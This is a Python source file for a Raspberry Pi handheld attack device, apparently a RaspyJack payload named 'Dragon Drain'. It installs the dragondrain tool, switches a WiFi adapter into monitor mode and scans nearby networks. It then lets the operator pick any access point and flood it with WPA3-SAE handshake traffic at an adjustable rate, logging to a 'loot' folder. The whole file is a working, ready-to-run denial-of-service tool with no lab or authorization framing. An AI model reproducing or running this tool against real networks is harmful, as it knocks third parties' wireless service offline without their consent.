#!/usr/bin/env python3
"""
RaspyJack Payload – Dragon Drain
=================================
WPA3-SAE Dragonfly handshake DoS attack using dragondrain.
Checks for dragondrain installation, scans WiFi networks on wlan1,
lets the user pick a target, and launches the attack.

Controls
--------
MAIN MENU:
  KEY1 : Scan networks on wlan1
  KEY3 : Exit

NETWORK LIST (after scan):
  UP / DOWN : Navigate
  OK        : Select target
  KEY1      : Rescan
  KEY3      : Back to main

ATTACK PARAMETERS:
  UP / DOWN    : Select parameter (-r packets/sec, -n MAC count)
  LEFT / RIGHT : Adjust value
  OK           : Confirm & start attack
  KEY3         : Back to network list

DURING ATTACK:
  KEY2 : Stop attack
  KEY3 : Exit
"""

import os
import sys
import time
import signal
import subprocess
import re

# Allow imports from RaspyJack root
sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._input_helper import get_button

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

WIDTH, HEIGHT = 128, 128
IFACE = "wlan1"
DRAGONDRAIN_DIR = "/opt/dragondrain-and-time"
DRAGONDRAIN_BIN = os.path.join(DRAGONDRAIN_DIR, "src", "dragondrain")
SCAN_TIMEOUT = 20  # seconds for airodump-ng

LOOT_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "loot", "DragonDrain")
os.makedirs(LOOT_DIR, exist_ok=True)

# ---------------------------------------------------------------------------
# GPIO & LCD init
# ---------------------------------------------------------------------------
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)

try:
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", 8)
    font_big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
except Exception:
    font = font_big = ImageFont.load_default()

# ---------------------------------------------------------------------------
# Global state
# ---------------------------------------------------------------------------
running = True
attack_proc = None


def cleanup(*_):
    global running
    running = False
    stop_attack()


signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# LCD helpers
# ---------------------------------------------------------------------------

def draw_screen(lines, title=None, highlight_idx=None):
    """Draw lines of text. Optional title bar and highlighted row."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    y = 2
    if title:
        d.rectangle([0, 0, WIDTH, 13], fill="#1a1a2e")
        d.text((3, 2), title[:20], font=font_big, fill="#00FFFF")
        y = 16
    for i, line in enumerate(lines):
        if highlight_idx is not None and i == highlight_idx:
            d.rectangle([0, y - 1, WIDTH, y + 10], fill="#2d0fff")
            d.text((3, y), line[:21], font=font, fill="#00FF00")
        else:
            d.text((3, y), line[:21], font=font, fill="#FFFFFF")
        y += 11
        if y > HEIGHT - 4:
            break
    LCD.LCD_ShowImage(img, 0, 0)


def draw_centered(text, color="#00FF00"):
    """Draw centred text on black background."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), text, font=font_big)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    d.text(((WIDTH - w) // 2, (HEIGHT - h) // 2), text, font=font_big, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)


def draw_progress(title, step, total, detail=""):
    """Draw a progress bar screen."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((3, 5), title[:20], font=font_big, fill="#00FFFF")
    bar_y = 30
    d.rectangle([10, bar_y, WIDTH - 10, bar_y + 12], outline="#05ff00")
    fill_w = int((WIDTH - 22) * step / max(total, 1))
    d.rectangle([11, bar_y + 1, 11 + fill_w, bar_y + 11], fill="#05ff00")
    pct = f"{int(100 * step / max(total, 1))}%"
    d.text((55, bar_y + 15), pct, font=font, fill="#FFFFFF")
    if detail:
        y = 60
        while detail and y < HEIGHT - 4:
            d.text((3, y), detail[:21], font=font, fill="#FFFF00")
            detail = detail[21:]
            y += 11
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# Shell helper
# ---------------------------------------------------------------------------

def run_cmd(cmd, timeout=None):
    """Run a shell command and return (returncode, stdout+stderr)."""
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
        )
        return proc.returncode, proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return -1, "timeout"
    except Exception as e:
        return -1, str(e)

# ---------------------------------------------------------------------------
# 1. Check / install dragondrain
# ---------------------------------------------------------------------------

def is_dragondrain_installed():
    return os.path.isfile(DRAGONDRAIN_BIN)


def install_dragondrain():
    """Interactive installation with progress on LCD."""
    steps = [
        ("apt update",      "sudo apt-get update -y"),
        ("apt upgrade",     "sudo apt-get upgrade -y"),
        ("git clone",       f"git clone https://github.com/vanhoefm/dragondrain-and-time.git {DRAGONDRAIN_DIR}"),
        ("install deps",    "sudo apt-get install -y autoconf automake libtool shtool libssl-dev pkg-config"),
        ("autoreconf",      f"cd {DRAGONDRAIN_DIR} && sudo autoreconf -i"),
        ("autogen",         f"cd {DRAGONDRAIN_DIR} && sudo ./autogen.sh"),
        ("configure",       f"cd {DRAGONDRAIN_DIR} && sudo ./configure"),
        ("patch radiotap",  None),  # handled specially
        ("make",            f"cd {DRAGONDRAIN_DIR} && sudo make"),
    ]
    total = len(steps)

    for idx, (label, cmd) in enumerate(steps):
        if not running:
            return False
        draw_progress("Installing", idx, total, label)
        print(f"[DragonDrain] Step {idx + 1}/{total}: {label}")

        if label == "patch radiotap":
            if not _patch_radiotap():
                draw_centered("Patch failed!", "#FF0000")
                time.sleep(2)
                return False
            continue

        if label == "git clone" and os.path.isdir(DRAGONDRAIN_DIR):
            print("[DragonDrain] Repo already cloned, skipping")
            continue

        rc, out = run_cmd(cmd, timeout=600)
        print(f"[DragonDrain]   rc={rc}")
        if rc != 0 and label not in ("apt upgrade",):
            draw_progress("INSTALL FAIL", idx, total, f"ERR: {label}")
            print(f"[DragonDrain]   ERROR: {out[-300:]}", file=sys.stderr)
            time.sleep(3)
            return False

    draw_progress("Installing", total, total, "Done!")
    time.sleep(1)

    if not os.path.isfile(DRAGONDRAIN_BIN):
        draw_centered("Binary missing!", "#FF0000")
        time.sleep(2)
        return False

    draw_centered("Installed OK", "#00FF00")
    time.sleep(1)
    return True


def _patch_radiotap():
    """Remove __packed from radiotap.h (line with '} __packed;')."""
    header = os.path.join(DRAGONDRAIN_DIR, "src", "aircrack-osdep", "radiotap", "radiotap.h")
    if not os.path.isfile(header):
        print(f"[DragonDrain] radiotap.h not found at {header}", file=sys.stderr)
        return False
    try:
        with open(header, "r") as f:
            lines = f.readlines()
        patched = False
        for i, line in enumerate(lines):
            if "__packed" in line and line.strip().startswith("}"):
                lines[i] = line.replace("__packed", "")
                patched = True
                print(f"[DragonDrain] Patched radiotap.h line {i + 1}")
                break
        if patched:
            with open(header, "w") as f:
                f.writelines(lines)
        else:
            print("[DragonDrain] __packed not found (already patched?)")
        return True
    except Exception as e:
        print(f"[DragonDrain] Patch error: {e}", file=sys.stderr)
        return False

# ---------------------------------------------------------------------------
# 2. Check wlan1
# ---------------------------------------------------------------------------

def check_wlan1():
    """Return True if wlan1 exists and is a wireless interface."""
    if not os.path.isdir(f"/sys/class/net/{IFACE}"):
        return False
    return os.path.isdir(f"/sys/class/net/{IFACE}/wireless")

# ---------------------------------------------------------------------------
# 3. Monitor mode
# ---------------------------------------------------------------------------

def setup_monitor():
    """Put IFACE into monitor mode. Return the usable interface name or None."""
    draw_centered("Monitor mode...", "#FFFF00")

    # Unmanage from NetworkManager
    run_cmd(f"nmcli device set {IFACE} managed no", timeout=5)
    run_cmd(f"sudo pkill -f 'wpa_supplicant.*{IFACE}'", timeout=5)
    time.sleep(0.5)

    # Already in monitor?
    rc, out = run_cmd(f"iwconfig {IFACE}")
    if "Mode:Monitor" in out:
        return IFACE

    # Method 1: airmon-ng
    run_cmd(f"sudo airmon-ng start {IFACE}", timeout=30)
    for name in (f"{IFACE}mon", IFACE):
        rc, out = run_cmd(f"iwconfig {name}")
        if "Mode:Monitor" in out:
            return name

    # Method 2: manual iwconfig
    run_cmd(f"sudo ifconfig {IFACE} down", timeout=5)
    time.sleep(0.3)
    run_cmd(f"sudo iwconfig {IFACE} mode monitor", timeout=5)
    time.sleep(0.3)
    run_cmd(f"sudo ifconfig {IFACE} up", timeout=5)
    time.sleep(0.5)
    rc, out = run_cmd(f"iwconfig {IFACE}")
    if "Mode:Monitor" in out:
        return IFACE

    return None

# ---------------------------------------------------------------------------
# 4. Scan networks
# ---------------------------------------------------------------------------

def scan_networks(mon_iface):
    """Scan with airodump-ng, return list of dicts {bssid, channel, essid, power}."""
    draw_centered(f"Scanning {SCAN_TIMEOUT}s...", "#FFFF00")

    csv_prefix = "/tmp/dragondrain_scan"
    subprocess.run(f"rm -f {csv_prefix}*", shell=True)

    cmd = (
        f"timeout {SCAN_TIMEOUT} airodump-ng --band abg "
        f"--output-format csv -w {csv_prefix} {mon_iface}"
    )
    subprocess.run(cmd, shell=True, capture_output=True)

    csv_file = f"{csv_prefix}-01.csv"
    if not os.path.isfile(csv_file):
        return []

    networks = []
    try:
        with open(csv_file, "r", errors="replace") as f:
            content = f.read()
        # Only keep the AP section (before Station MAC)
        if "Station MAC" in content:
            content = content.split("Station MAC")[0]
        lines = content.strip().split("\n")

        header_found = False
        for line in lines:
            parts = [p.strip() for p in line.split(",")]
            if not header_found:
                if len(parts) > 5 and "BSSID" in parts[0]:
                    header_found = True
                continue
            if len(parts) < 14:
                continue
            bssid = parts[0].strip()
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                continue
            try:
                power = int(parts[8].strip())
            except (ValueError, IndexError):
                power = -100
            try:
                channel = int(parts[3].strip())
            except (ValueError, IndexError):
                channel = 0
            essid = parts[13].strip() if len(parts) > 13 else ""
            if not essid:
                essid = "(hidden)"
            networks.append({
                "bssid": bssid,
                "channel": channel,
                "essid": essid,
                "power": power,
            })
    except Exception as e:
        print(f"[DragonDrain] CSV parse error: {e}", file=sys.stderr)

    # Sort by signal strength (strongest first)
    networks.sort(key=lambda n: n["power"], reverse=True)
    return networks

# ---------------------------------------------------------------------------
# 5. Attack
# ---------------------------------------------------------------------------

def stop_attack():
    global attack_proc
    if attack_proc and attack_proc.poll() is None:
        try:
            os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
        except Exception:
            pass
        attack_proc = None


def launch_attack(mon_iface, target, rate, nmac):
    """Launch dragondrain in a background process. Return the Popen object."""
    cmd = [
        "sudo", DRAGONDRAIN_BIN,
        "-d", mon_iface,
        "-a", target["bssid"],
        "-c", str(target["channel"]),
        "-b", "54",
        "-n", str(nmac),
        "-r", str(rate),
    ]
    print(f"[DragonDrain] Launching: {' '.join(cmd)}")
    log_path = os.path.join(
        LOOT_DIR,
        f"attack_{target['bssid'].replace(':', '')}_{int(time.time())}.log",
    )
    log_f = open(log_path, "w")
    proc = subprocess.Popen(
        cmd,
        stdout=log_f,
        stderr=subprocess.STDOUT,
        preexec_fn=os.setsid,
    )
    return proc

# ---------------------------------------------------------------------------
# 6. UI screens
# ---------------------------------------------------------------------------

def screen_main_menu():
    """Main menu. Returns next state or None to exit."""
    draw_screen(
        [
            f"Interface: {IFACE}",
            "",
            "KEY1  Scan networks",
            "KEY3  Exit",
        ],
        title="Dragon Drain",
    )
    while running:
        btn = get_button(PINS, GPIO)
        if btn == "KEY3":
            return None
        if btn == "KEY1":
            return "scan"
        time.sleep(0.05)
    return None


def screen_network_list(networks):
    """Scrollable network list. Returns selected network dict, 'rescan', or None."""
    if not networks:
        draw_centered("No networks!", "#FF0000")
        time.sleep(2)
        return None

    sel = 0
    scroll = 0
    VISIBLE = 9

    while running:
        btn = get_button(PINS, GPIO)
        if btn == "KEY3":
            return None
        if btn == "KEY1":
            return "rescan"
        if btn == "DOWN":
            sel = min(sel + 1, len(networks) - 1)
        if btn == "UP":
            sel = max(sel - 1, 0)
        if btn == "OK":
            return networks[sel]

        if sel < scroll:
            scroll = sel
        if sel >= scroll + VISIBLE:
            scroll = sel - VISIBLE + 1

        lines = []
        for n in networks[scroll:scroll + VISIBLE]:
            ch = str(n["channel"]).rjust(3)
            pw = str(n["power"]).rjust(4)
            name = n["essid"][:10]
            lines.append(f"{ch}{pw} {name}")

        draw_screen(lines, title=f"Networks ({len(networks)})", highlight_idx=sel - scroll)
        time.sleep(0.05)
    return None


def screen_params(target):
    """Let user tweak -r (rate) and -n (nmac). Returns (rate, nmac) or None."""
    rate = 200
    nmac = 20
    params = [("Packets/s -r", "rate"), ("MAC count -n", "nmac")]
    sel = 0

    while running:
        btn = get_button(PINS, GPIO)
        if btn == "KEY3":
            return None
        if btn == "UP":
            sel = max(sel - 1, 0)
        if btn == "DOWN":
            sel = min(sel + 1, len(params) - 1)
        if btn == "LEFT":
            if sel == 0:
                rate = max(10, rate - 50)
            else:
                nmac = max(1, nmac - 5)
        if btn == "RIGHT":
            if sel == 0:
                rate = min(1000, rate + 50)
            else:
                nmac = min(100, nmac + 5)
        if btn == "OK":
            return (rate, nmac)

        lines = [
            f"Target: {target['essid'][:15]}",
            f"BSSID: {target['bssid']}",
            f"CH: {target['channel']}",
            "",
            f" Packets/s -r: {rate}",
            f" MAC count -n: {nmac}",
            "",
            "L/R adjust  OK start",
            "KEY3 back",
        ]
        draw_screen(lines, title="Attack Params", highlight_idx=sel + 4)
        time.sleep(0.05)
    return None


def screen_attack(mon_iface, target, rate, nmac):
    """Run attack and show status. Returns when user stops or attack ends."""
    global attack_proc
    attack_proc = launch_attack(mon_iface, target, rate, nmac)
    start_time = time.time()

    while running:
        btn = get_button(PINS, GPIO)
        if btn in ("KEY2", "KEY3"):
            stop_attack()
            draw_centered("Attack stopped", "#FFFF00")
            time.sleep(1)
            return

        elapsed = int(time.time() - start_time)
        mins, secs = divmod(elapsed, 60)

        alive = attack_proc and attack_proc.poll() is None
        status = "RUNNING" if alive else "ENDED"

        lines = [
            f"Target: {target['essid'][:15]}",
            f"{target['bssid']}",
            f"CH:{target['channel']}  -r:{rate} -n:{nmac}",
            "",
            f"Status: {status}",
            f"Time: {mins:02d}:{secs:02d}",
            "",
            "KEY2 stop  KEY3 exit",
        ]
        draw_screen(lines, title="Dragon Drain")

        if not alive:
            time.sleep(2)
            return

        time.sleep(0.2)

# ---------------------------------------------------------------------------
# 7. Main flow
# ---------------------------------------------------------------------------

def main():
    global running

    # --- Step 1: Check wlan1 ---
    draw_centered("Checking wlan1...", "#FFFF00")
    time.sleep(0.5)
    if not check_wlan1():
        draw_screen(
            [
                f"{IFACE} not found!",
                "",
                "Plug in a USB WiFi",
                "adapter and retry.",
                "",
                "KEY3 to exit",
            ],
            title="No Interface",
        )
        while running:
            if get_button(PINS, GPIO) == "KEY3":
                break
            time.sleep(0.05)
        return

    draw_centered("wlan1 OK", "#00FF00")
    time.sleep(0.8)

    # --- Step 2: Check / install dragondrain ---
    if not is_dragondrain_installed():
        draw_screen(
            [
                "dragondrain not",
                "found. Install now?",
                "",
                "OK   Install",
                "KEY3 Cancel",
            ],
            title="Install?",
        )
        while running:
            btn = get_button(PINS, GPIO)
            if btn == "KEY3":
                return
            if btn == "OK":
                break
            time.sleep(0.05)

        if not running:
            return
        if not install_dragondrain():
            draw_centered("Install failed!", "#FF0000")
            time.sleep(2)
            return

    # --- Step 3: Monitor mode ---
    mon_iface = setup_monitor()
    if not mon_iface:
        draw_screen(
            [
                "Monitor mode FAILED",
                f"on {IFACE}.",
                "",
                "Ensure your dongle",
                "supports monitor.",
                "",
                "KEY3 to exit",
            ],
            title="Error",
        )
        while running:
            if get_button(PINS, GPIO) == "KEY3":
                break
            time.sleep(0.05)
        return

    # --- Step 4: Main loop ---
    while running:
        action = screen_main_menu()
        if action is None:
            break
        if action != "scan":
            continue

        # Scan/rescan loop
        while running:
            nets = scan_networks(mon_iface)
            result = screen_network_list(nets)
            if result is None:
                break  # back to main menu
            if result == "rescan":
                continue

            # result is a network dict — show param screen
            params = screen_params(result)
            if params is None:
                continue  # back to network list
            rate, nmac = params
            screen_attack(mon_iface, result, rate, nmac)


try:
    main()
except Exception as exc:
    print(f"[DragonDrain] FATAL: {exc}", file=sys.stderr)
finally:
    stop_attack()
    LCD.LCD_Clear()
    GPIO.cleanup()
